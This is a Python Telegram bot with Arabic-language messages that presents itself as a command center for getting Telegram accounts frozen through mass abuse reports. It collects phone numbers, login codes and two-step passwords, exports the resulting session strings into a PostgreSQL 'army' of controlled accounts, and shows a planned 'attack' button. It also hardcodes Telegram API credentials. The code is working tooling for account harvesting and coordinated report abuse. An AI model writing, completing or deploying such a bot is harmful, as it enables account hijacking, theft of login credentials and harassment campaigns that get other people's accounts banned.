import os
import asyncio
import psycopg2
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import SessionPasswordNeeded

# --- الإعدادات ---
API_ID = 26569722
API_HASH = "90a9314c99544976451664d4c1f964fc"
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL") # رابط قاعدة بيانات PostgreSQL من ريندر

# --- ربط قاعدة البيانات ---
def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session_string TEXT)")
    conn.commit()
    cur.close()
    conn.close()

init_db()

app = Client("MikeyCommandCenter", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
user_steps = {}

@app.on_message(filters.command("start"))
async def start(client, message):
    text = "🔥 **مركز عمليات مايكي الضارب** 🔥\n\nنظام تجميد الحسابات بالبلاغات الدولية جاهز.\nعدد الحسابات حالياً تحت سيطرتك."
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ إضافة قوة جديدة (حساب)", callback_data="add_acc")],
        [InlineKeyboardButton("📊 عرض الجيش", callback_data="stats"), InlineKeyboardButton("📡 اللوج", callback_data="log")],
        [InlineKeyboardButton("☣️ شن الهجوم (قريباً)", callback_data="attack_config")]
    ])
    await message.reply_text(text, reply_markup=keyboard)

@app.on_callback_query(filters.regex("add_acc"))
async def add_acc(client, cb):
    await cb.message.edit_text("📱 أرسل الرقم مع المفتاح الدولي (مثل +1...):")
    user_steps[cb.from_user.id] = {"step": "phone"}

@app.on_message(filters.text & filters.private)
async def flow(client, message):
    uid = message.from_user.id
    if uid not in user_steps: return
    
    step = user_steps[uid]["step"]
    
    if step == "phone":
        phone = message.text.strip()
        user_steps[uid]["phone"] = phone
        c = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
        await c.connect()
        try:
            sent_code = await c.send_code(phone)
            user_steps[uid].update({"step": "code", "client": c, "hash": sent_code.phone_code_hash})
            await message.reply_text("📩 وصلك كود؟ أرسله الحين:")
        except Exception as e:
            await message.reply_text(f"❌ خطأ بالرقم: {e}")
            del user_steps[uid]

    elif step == "code":
        try:
            c = user_steps[uid]["client"]
            await c.sign_in(user_steps[uid]["phone"], user_steps[uid]["hash"], message.text)
            await save_acc(message, c, uid)
        except SessionPasswordNeeded:
            user_steps[uid]["step"] = "pass"
            await message.reply_text("🔐 أرسل كلمة السر (التحقق بخطوتين):")
        except Exception as e:
            await message.reply_text(f"❌ كود غلط: {e}")

    elif step == "pass":
        try:
            c = user_steps[uid]["client"]
            await c.check_password(message.text)
            await save_acc(message, c, uid)
        except Exception as e:
            await message.reply_text(f"❌ كلمة سر غلط: {e}")

async def save_acc(msg, c, uid):
    session = await c.export_session_string()
    phone = user_steps[uid]["phone"]
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, session))
    conn.commit()
    cur.close()
    conn.close()
    await c.disconnect()
    await msg.reply_text(f"✅ تم سحب السيزون بنجاح! {phone} صار في الجيب.")
    del user_steps[uid]

@app.on_callback_query(filters.regex("stats"))
async def show_stats(client, cb):
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("SELECT phone FROM accounts")
    accs = cur.fetchall()
    cur.close()
    conn.close()
    text = f"📊 **قائمة الحسابات الجاهزة:**\n\n" + "\n".join([f"• `{a[0]}`" for a in accs]) if accs else "لا يوجد حسابات مضافة."
    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="home")]]))

@app.on_callback_query(filters.regex("home"))
async def home(client, cb):
    await start(client, cb.message)

print("Mikey is ready to burn the servers...")
app.run()
